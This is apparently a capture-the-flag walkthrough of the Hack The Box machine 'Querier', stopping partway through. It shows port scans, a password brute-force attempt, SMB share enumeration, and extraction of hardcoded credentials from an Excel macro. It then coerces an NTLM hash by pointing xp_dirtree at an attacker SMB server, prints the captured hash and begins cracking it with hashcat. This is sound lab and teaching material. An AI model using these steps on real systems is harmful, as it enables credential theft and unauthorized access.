# Table of Contents:

- [Querier](#querier)
  - [Network Enum:](#network-enum)
  - [Host Enum:](#host-enum)
  - [`user.txt`:](#usertxt)
  - [`root.txt`](roottxt):

<!-- ToC generated using https://imthenachoman.github.io/nGitHubTOC/ -->

# Querier

https://www.hackthebox.eu/home/machines/profile/175

![1](./querier/1.png)

## Network Enum:

Lets start off with a quick `nmap`:

```bash
root@kali:~/Desktop/querier# nmap -sV -O 10.10.10.125
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-18 22:48 EDT
Nmap scan report for 10.10.10.125
Host is up (0.20s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server vNext tech preview 14.00.1000
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=3/18%OT=135%CT=1%CU=42467%PV=Y%DS=2%DC=I%G=Y%TM=5C9058
OS:90%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=O%TS
OS:=U)SEQ(SP=102%GCD=1%ISR=10C%TI=RD%CI=I%II=I%TS=U)SEQ(SP=102%GCD=1%ISR=10
OS:C%TI=I%CI=I%TS=U)OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NN
OS:S%O5=M54DNW8NNS%O6=M54DNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W
OS:6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=
OS:O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%
OS:DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O
OS:=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80
OS:%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q
OS:=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y
OS:%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.03 seconds
root@kali:~/Desktop/querier# nmap -p1-65535 -T4 10.10.10.125
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-18 23:09 EDT
Stats: 0:08:14 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 71.33% done; ETC: 23:21 (0:03:19 remaining)
Nmap scan report for 10.10.10.125
Host is up (0.15s latency).
Not shown: 65495 closed ports, 26 filtered ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 877.01 seconds
root@kali:~/Desktop/querier# 
```

It seems like there is SQL running on this host. Lets search for common exploits for this version of the service:

```bash
root@kali:~/Desktop/querier# searchsploit vNext
Exploits: No Result
Shellcodes: No Result
root@kali:~/Desktop/querier# searchsploit "Microsoft SQL Server"
------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                           |  Path
                                                                         | (/usr/share/exploitdb/)
------------------------------------------------------------------------- ----------------------------------------
Microsoft BizTalk Server 2000/2002 DTA - 'RawCustomSearchField.asp' SQL  | exploits/asp/webapps/22555.txt
Microsoft BizTalk Server 2000/2002 DTA - 'rawdocdata.asp' SQL Injection  | exploits/asp/webapps/22554.txt
Microsoft SQL Server - 'sp_replwritetovarbin()' Heap Overflow            | exploits/windows/local/7501.asp
Microsoft SQL Server - Database Link Crawling Command Execution (Metaspl | exploits/windows/remote/23649.rb
Microsoft SQL Server - Distributed Management Objects 'sqldmo.dll' Buffe | exploits/windows/dos/4379.html
Microsoft SQL Server - Distributed Management Objects Buffer Overflow    | exploits/windows/remote/4398.html
Microsoft SQL Server - Hello Overflow (MS02-056) (Metasploit)            | exploits/windows/remote/16398.rb
Microsoft SQL Server - Payload Execution (Metasploit)                    | exploits/windows/remote/16395.rb
Microsoft SQL Server - Payload Execution (via SQL Injection) (Metasploit | exploits/windows/remote/16394.rb
Microsoft SQL Server - Resolution Overflow (MS02-039) (Metasploit)       | exploits/windows/remote/16393.rb
Microsoft SQL Server - sp_replwritetovarbin Memory Corruption (MS09-004) | exploits/windows/remote/16392.rb
Microsoft SQL Server - sp_replwritetovarbin Memory Corruption (MS09-004) | exploits/windows/remote/16396.rb
Microsoft SQL Server 2000 - 'SQLXML' Buffer Overflow (PoC)               | exploits/windows/dos/21540.txt
Microsoft SQL Server 2000 - Database Consistency Checkers Buffer Overflo | exploits/windows/remote/21650.txt
Microsoft SQL Server 2000 - Password Encrypt procedure Buffer Overflow   | exploits/windows/local/21549.txt
Microsoft SQL Server 2000 - Resolution Service Heap Overflow             | exploits/windows/remote/21652.cpp
Microsoft SQL Server 2000 - SQLXML Script Injection                      | exploits/windows/remote/21541.txt
Microsoft SQL Server 2000 - User Authentication Remote Buffer Overflow   | exploits/windows/remote/21693.nasl
Microsoft SQL Server 2000 - sp_MScopyscript SQL Injection                | exploits/windows/remote/21651.txt
Microsoft SQL Server 2000 / Microsoft Jet 4.0 Engine - Unicode Buffer Ov | exploits/windows/dos/21569.txt
Microsoft SQL Server 7.0 - Remote Denial of Service (1)                  | exploits/windows/dos/24639.c
Microsoft SQL Server 7.0 - Remote Denial of Service (2)                  | exploits/windows/dos/24640.c
Microsoft SQL Server 7.0/2000 / Data Engine 1.0/2000 - xp_displayparamst | exploits/windows/local/20451.c
Microsoft SQL Server 7.0/2000 / Data Engine 1.0/2000 - xp_peekqueue Buff | exploits/windows/local/20457.c
Microsoft SQL Server 7.0/2000 / Data Engine 1.0/2000 - xp_showcolv Buffe | exploits/windows/local/20456.c
Microsoft SQL Server 7.0/2000 / MSDE - Named Pipe Denial of Service (MS0 | exploits/windows/dos/22957.cpp
Microsoft SQL Server 7.0/2000 JET Database Engine 4.0 - Buffer Overrun   | exploits/windows/dos/22576.txt
Microsoft SQL Server 7.0/7.0 SP1 - NULL Data Denial of Service           | exploits/windows/dos/19638.c
Microsoft SQL Server Management Studio 17.9 - '.xel' XML External Entity | exploits/windows/local/45585.txt
Microsoft SQL Server Management Studio 17.9 - '.xmla' XML External Entit | exploits/windows/local/45587.txt
Microsoft SQL Server Management Studio 17.9 - XML External Entity Inject | exploits/windows/local/45583.txt
Microsoft Windows SQL Server - Remote Denial of Service (MS03-031)       | exploits/windows/dos/65.c
------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
root@kali:~/Desktop/querier#
```

Google doesn't show anything promising either. Dead end for now. Lets enumerate the SQL service some more:

```bash
root@kali:~/Desktop/querier# nmap -A -p 1433 10.10.10.125
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-18 23:16 EDT
Nmap scan report for 10.10.10.125
Host is up (0.22s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server  14.00.1000.00
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: QUERIER
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: QUERIER.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2019-03-19T01:24:51
|_Not valid after:  2049-03-19T01:24:51
|_ssl-date: 2019-03-19T03:16:30+00:00; 0s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (93%), Microsoft Windows Server 2016 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2012 R2 Update 1 (90%), Microsoft Windows Server 2016 build 10586 - 14393 (90%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (90%), Microsoft Windows 10 1703 (90%), Microsoft Windows Server 2008 R2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

Host script results:
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 
|_    TCP port: 1433

TRACEROUTE (using port 1433/tcp)
HOP RTT       ADDRESS
1   154.32 ms 10.10.12.1
2   554.76 ms 10.10.10.125

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.52 seconds
root@kali:~/Desktop/querier# echo 'sa' > user.txt
root@kali:~/Desktop/querier# medusa -h 10.10.10.125 -U user.txt -P /usr/share/wordlists/fasttrack.txt -M mssql
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ERROR: [mssql.mod] SQL server (10.10.10.125) did not respond to port query request. Using default value of 1433/tcp.
ACCOUNT CHECK: [mssql] Host: 10.10.10.125 (1 of 1, 0 complete) User: sa (1 of 1, 0 complete) Password: Spring2017 (1 of 221 complete)
...
ACCOUNT CHECK: [mssql] Host: 10.10.10.125 (1 of 1, 0 complete) User: sa (1 of 1, 0 complete) Password: starwars (221 of 221 complete)
root@kali:~/Desktop/querier# medusa -h 10.10.10.125 -U user.txt -P /usr/share/wordlists/sqlmap.txt -M mssql
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ERROR: [mssql.mod] SQL server (10.10.10.125) did not respond to port query request. Using default value of 1433/tcp.
ACCOUNT CHECK: [mssql] Host: 10.10.10.125 (1 of 1, 0 complete) User: sa (1 of 1, 0 complete) Password: ` (1 of 1406529 complete)
...
```

Tried simple brute force with the common username of `sa` with no luck. Lets enum the NETBIOS connections. According to wikipedia NETBIOS provides three distict services:

1. Session service (NetBIOS-SSN) for connection-oriented communication (TCP).
2. Name Service (NETBIOS-NS) for name registration and resolution (TCP).
3. Datagram distribution (UDP) service (NetBIOS-DGM) for connectionless communication.

Looks like we have NetBIOS-SSN open. Lets enumerate some more:

```bash
root@kali:~/Desktop/querier# enum4linux -U -o 10.10.10.125
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Mar 18 23:42:58 2019

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.125
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.125    |
 ==================================================== 
[E] Can't find workgroup/domain


 ===================================== 
|    Session Check on 10.10.10.125    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 10.10.10.125 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.10.125    |
 =========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
could not obtain sid from server
error: NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 10.10.10.125    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.10.125 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[E] Can't get OS info with srvinfo: NT_STATUS_ACCESS_DENIED

 ============================= 
|    Users on 10.10.10.125    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED
enum4linux complete on Mon Mar 18 23:43:22 2019
root@kali:~/Desktop/querier# nmap --script smb-enum-users.nse -sS -sU -p U:137,T:139 10.10.10.125
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-19 22:40 EDT
Nmap scan report for 10.10.10.125
Host is up (0.17s latency).

PORT    STATE         SERVICE
139/tcp open          netbios-ssn
137/udp open|filtered netbios-ns

Nmap done: 1 IP address (1 host up) scanned in 7.06 seconds
root@kali:~/Desktop/querier# nmblookup -A 10.10.10.125
Looking up status of 10.10.10.125
No reply from 10.10.10.125

root@kali:~/Desktop/querier# nbtscan 10.10.10.125
Doing NBT name scan for addresses from 10.10.10.125

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
root@kali:~/Desktop/querier# smbmap -H 10.10.10.125
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.125...
[+] IP: 10.10.10.125:445	Name: 10.10.10.125                                      
	Disk                                                  	Permissions
	----                                                  	-----------
[!] Access Denied
root@kali:~/Desktop/querier# rpcclient -U "" -N 10.10.10.125
could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
could not obtain sid from server
error: NT_STATUS_ACCESS_DENIED
root@kali:~/Desktop/querier# nmap --script smb-vuln* -p 139,445 10.10.10.125
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-19 22:51 EDT
Nmap scan report for 10.10.10.125
Host is up (0.27s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server disconnected the connection

Nmap done: 1 IP address (1 host up) scanned in 11.78 seconds
root@kali:~/Desktop/querier# smbclient -L \\10.10.10.125 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Reports         Disk      
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
root@kali:~/Desktop/querier#
```

Okay, looks like there is a share called `Reports` that is advertised. Lets try and connect:

```bash
root@kali:~/Desktop/querier# smbclient //10.10.10.125/Reports -N
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> ls
  .                                   D        0  Mon Jan 28 18:23:48 2019
  ..                                  D        0  Mon Jan 28 18:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 17:21:34 2019

		6469119 blocks of size 4096. 1608023 blocks available
smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (10.1 KiloBytes/sec) (average 10.1 KiloBytes/sec)
smb: \> quit
root@kali:~/Desktop/querier#
```

Nice, we were able to connect! Lets look at the spreadsheet. 

```bash
root@kali:~/Desktop/querier# strings Currency\ Volume\ Report.xlsm 
[Content_Types].xml 
apP<*
Fi+i
d|}5
o=`Fh
O(%$
_rels/.rels 
BKwAH
GJy(v
USh9i
r:"y_dl
;O6-
xl/workbook.xml
66>>3sf|
N>~8
2}${
u-z=
C`A>
hZJ6
xl/_rels/workbook.xml.rels 
a`K^A
 8j_
aU^_-_
>- *
K2|R
xl/worksheets/sheet1.xml
0tU	
!b+Z
%4Z-K
xl/theme/theme1.xml
QV32
lJZv
k8(4|OH
bP{}2!#
L`|X
A)>\
kPDIr
RSLX"7
%Cr`%R.
=|d#a[ 
R9D15
/$Dz
;D=C
|]p+~o
,kzh
yUs^
q&?'2
Tx3&
Pb/3 
qyjui
kE"'
*#4k
XX/+
muF8=
Zu@,
Ymvj
j%e~
 +c`
xl/styles.xml
+< ,d
dNhyF
!E		
|8Ok
Gq2:@
/XQkx
g"$Q4<8
xl/vbaProject.bin
Zol[W
I\7n
&M*b
kkXc]9
Eqyc
l9#g.
qY.a
TZOs
&$nv
HkE^
.Zv2a&
8C)q
|zV)Q^
caP;&
\EW:|
Ay82R
;1rt
&*e}R)
q_Me
JVwe
d:)u9
F&_u	
L~In
c7s;
EdQm
Cft*
J'@fR
Ck<G
{!A2t
3L!NJ{nJ
zMEx\
{i}$
W5Dj'w
?{Qv
le{Bs
#.4p0+,4
kq54n\
x{z@
x[V/
UnAf
.190
vL9#
O?m(
%=ZO
;$E}
pyNWJy
bw|>rD
docProps/core.xml 
2^S^
'iKy
=(f#
0&aB6IL
docProps/app.xml 
/^="
&jWR
7y~/
<U[k<
rN<2L
[Content_Types].xmlPK
_rels/.relsPK
;O6-
xl/workbook.xmlPK
xl/_rels/workbook.xml.relsPK
xl/worksheets/sheet1.xmlPK
xl/theme/theme1.xmlPK
xl/styles.xmlPK
xl/vbaProject.binPK
docProps/core.xmlPK
docProps/app.xmlPK
root@kali:~/Desktop/querier#
```

Hmm, `xl/vbaProject.bin` is interesting. We need to download a tool to extract VBA scripts from an XLSM file on linux. Lets use this (https://github.com/decalage2/oletools): 

```bash
root@kali:~/Desktop/querier# pip install -U oletools
Collecting oletools
  Downloading https://files.pythonhosted.org/packages/79/f5/9b1a89145ac9bce77c235fee549fc7af617d778bb29af4c8dd1561813a10/oletools-0.53.1.zip (1.6MB)
    100% |████████████████████████████████| 1.6MB 396kB/s 
Collecting pyparsing (from oletools)
  Downloading https://files.pythonhosted.org/packages/de/0a/001be530836743d8be6c2d85069f46fecf84ac6c18c7f5fb8125ee11d854/pyparsing-2.3.1-py2.py3-none-any.whl (61kB)
    100% |████████████████████████████████| 71kB 1.4MB/s 
Building wheels for collected packages: oletools
  Running setup.py bdist_wheel for oletools ... done
  Stored in directory: /root/.cache/pip/wheels/4b/d9/26/a82ff4d87ef76942464afce67daec1ea1b2f0186fcb7f9ba96
Successfully built oletools
Installing collected packages: pyparsing, oletools
  Found existing installation: pyparsing 2.2.0
    Not uninstalling pyparsing at /usr/lib/python2.7/dist-packages, outside environment /usr
Successfully installed oletools-0.53.1 pyparsing-2.3.1
root@kali:~/Desktop/querier#
```

Now lets look at this file:

```bash
root@kali:~/Desktop/querier# olevba --help
Usage: olevba [options] <filename> [filename2 ...]

Options:
  -h, --help            show this help message and exit
  -r                    find files recursively in subdirectories.
  -z ZIP_PASSWORD, --zip=ZIP_PASSWORD
                        if the file is a zip archive, open all files from it,
                        using the provided password (requires Python 2.6+)
  -f ZIP_FNAME, --zipfname=ZIP_FNAME
                        if the file is a zip archive, file(s) to be opened
                        within the zip. Wildcards * and ? are supported.
                        (default:*)
  -a, --analysis        display only analysis results, not the macro source
                        code
  -c, --code            display only VBA source code, do not analyze it
  --decode              display all the obfuscated strings with their decoded
                        content (Hex, Base64, StrReverse, Dridex, VBA).
  --attr                display the attribute lines at the beginning of VBA
                        source code
  --reveal              display the macro source code after replacing all the
                        obfuscated strings by their decoded content.
  -l LOGLEVEL, --loglevel=LOGLEVEL
                        logging level debug/info/warning/error/critical
                        (default=warning)
  --deobf               Attempt to deobfuscate VBA expressions (slow)
  --relaxed             Do not raise errors if opening of substream fails

  Output mode (mutually exclusive):
    -t, --triage        triage mode, display results as a summary table
                        (default for multiple files)
    -d, --detailed      detailed mode, display full results (default for
                        single file)
    -j, --json          json mode, detailed in json format (never default)
root@kali:~/Desktop/querier# olevba Currency\ Volume\ Report.xlsm 
olevba 0.53.1 - http://decalage.info/python/oletools
Flags        Filename                                                         
-----------  -----------------------------------------------------------------
OpX:M-S-H--- Currency Volume Report.xlsm
===============================================================================
FILE: Currency Volume Report.xlsm
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: u'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
 
  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: u'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+------------+-------------+-----------------------------------------+
| Type       | Keyword     | Description                             |
+------------+-------------+-----------------------------------------+
| Suspicious | Open        | May open a file                         |
| Suspicious | Hex Strings | Hex-encoded strings were detected, may  |
|            |             | be used to obfuscate strings (option    |
|            |             | --decode to see all)                    |
+------------+-------------+-----------------------------------------+

root@kali:~/Desktop/querier#
```

Okay, we got something interesting:

- UID: `reporting`
- Password: `PcwTWTHRwryjc$c6`
- Database: `volume`

With this information, we should be able to login to the SQL server. 

## Host Enum:

```bash
root@kali:~/Desktop/querier# mysql -u reporting -D volume -h 10.10.10.125 -p
Enter password: 
ERROR 2003 (HY000): Can't connect to MySQL server on '10.10.10.125' (111 "Connection refused")
root@kali:~/Desktop/querier#
```

However, from linux, we need an application that supports TDS (https://en.wikipedia.org/wiki/Tabular_Data_Stream) and NTLM authentication from linux. There are some options:

- https://help.interfaceware.com/kb/904
- https://github.com/SecureAuthCorp/impacket

Impacket is easy to use and supports many other protocols for Windows that could become usefull in the future. Lets get to using it:

```bash
root@kali:~/Desktop/querier# git clone https://github.com/SecureAuthCorp/impacket.git
root@kali:~/Desktop/querier# cd impacket/
root@kali:~/Desktop/querier# python setup.py install
```

Here is a great introduction to the tools we just downloaded: https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/. The tool we want to use is `mssqlclient.py`:

```bash
root@kali:~/Desktop/querier/impacket/examples# mssqlclient.py --help
Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation

usage: mssqlclient.py [-h] [-port PORT] [-db DB] [-windows-auth] [-debug]
                      [-file FILE] [-hashes LMHASH:NTHASH] [-no-pass] [-k]
                      [-aesKey hex key] [-dc-ip ip address]
                      target

TDS client implementation (SSL supported).

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

optional arguments:
  -h, --help            show this help message and exit
  -port PORT            target MSSQL port (default 1433)
  -db DB                MSSQL database instance (default None)
  -windows-auth         whether or not to use Windows Authentication (default
                        False)
  -debug                Turn DEBUG output ON
  -file FILE            input file with commands to execute in the SQL shell

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from
                        ccache file (KRB5CCNAME) based on target parameters.
                        If valid credentials cannot be found, it will use the
                        ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)
  -dc-ip ip address     IP Address of the domain controller. If ommited it use
                        the domain part (FQDN) specified in the target
                        parameter
root@kali:~/Desktop/querier/impacket/examples#
```

Lets connect (note the `\` to escape the bash special character `$`):

```bash
root@kali:~/Desktop/querier/impacket/examples# ./mssqlclient.py reporting:PcwTWTHRwryjc\$c6@10.10.10.125 -debug -db volume -windows-auth
Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> 
```

Nice! To get a login, we need to get better credentials because these credentials don't allow for us to get remote code execution. After looking through the database and tables, there wasn't anything interesting. 

After some research, I stumbled on some other ways to hack SMB credentials by capturing NTLM hashes. The idea is to intercept an NTLM hash and try to either pass the hash or try to crack it off line. The attack is described here:

- https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html#ntlmv2
- https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478

So we will set up an SMB server on our host and see if we can get the SQL service to connect to our server using the `xp_dirtree` command and present a hashed nonce we can possibly crack offline. 

```bash
root@kali:~/Desktop/querier/impacket/examples# ./mssqlclient.py reporting:PcwTWTHRwryjc\$c6@10.10.10.125 -debug -windows-auth
Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> EXEC master.sys.xp_dirtree "\\10.10.12.25\test"
subdirectory                                                                                                                                                                                                                                                            depth   
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -----------   
SQL> exit
root@kali:~/Desktop/querier/impacket/examples#
```

In another window, we catch the connection:

```bash
root@kali:~/Desktop/querier/impacket/examples# ./smbserver.py test . -ip 10.10.12.25 -debug -smb2support
Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.125,49723)
[*] AUTHENTICATE_MESSAGE (QUERIER\mssql-svc,QUERIER)
[*] User mssql-svc\QUERIER authenticated successfully
[*] mssql-svc::QUERIER:4141414141414141:ad71c7f5171a8b2e0b8b01caacb9281c:010100000000000000a502fe9edfd401b70782fcc7bc2ae200000000010010004d006e007a005800490061006b0078000200100055005a006200590066007a0073007000030010004d006e007a005800490061006b0078000400100055005a006200590066007a00730070000700080000a502fe9edfd4010600040002000000080030003000000000000000000000000030000010ea944b4c0be8993066b2d94663f632f30e06ad6e435553aea7fafc606510750a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310032002e0032003500000000000000000000000000
[*] Connecting Share(1:test)
[*] AUTHENTICATE_MESSAGE (\,QUERIER)
[*] User \QUERIER authenticated successfully
[*] :::00::4141414141414141
[*] Disconnecting Share(1:test)
[*] Handle: [Errno 104] Connection reset by peer
[*] Closing down connection (10.10.10.125,49723)
[*] Remaining connections []
```

Now lets try and crack this hash:

```bash
root@kali:~/Desktop/querier# echo "mssql-svc::QUERIER:4141414141414141:ad71c7f5171a8b2e0b8b01caacb9281c:010100000000000000a502fe9edfd401b70782fcc7bc2ae200000000010010004d006e007a005800490061006b0078000200100055005a006200590066007a0073007000030010004d006e007a005800490061006b0078000400100055005a006200590066007a00730070000700080000a502fe9edfd4010600040002000000080030003000000000000000000000000030000010ea944b4c0be8993066b2d94663f632f30e06ad6e435553aea7fafc606510750a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310032002e0032003500000000000000000000000000" > hash.txt
root@kali:~/Desktop/querier# hashcat -m 5600 hash.txt -o cracked.txt /usr/share/wordlists/rockyou.txt --force
hashcat (v4.2.1) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-5557U CPU @ 3.10GHz, 512/1480 MB allocatable, 2MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
